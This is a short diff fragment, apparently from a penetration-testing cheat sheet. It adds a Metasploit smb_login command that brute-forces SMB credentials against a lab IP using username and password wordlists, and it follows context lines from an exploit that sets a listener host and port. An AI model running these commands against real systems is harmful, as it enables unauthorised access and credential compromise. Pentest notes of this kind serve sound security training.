@@ -22,6 +22,15 @@ set LHOST <local-ip>; \
 set LPORT <local-port>; \
 exploit"
 
+
+"use auxiliary/scanner/smb/smb_login
+set rhosts 192.168.1.105
+set user_file user.txt
+set pass_file pass.txt
+set smbdomain ignite
+exploit"
+
+
 ```
 
 
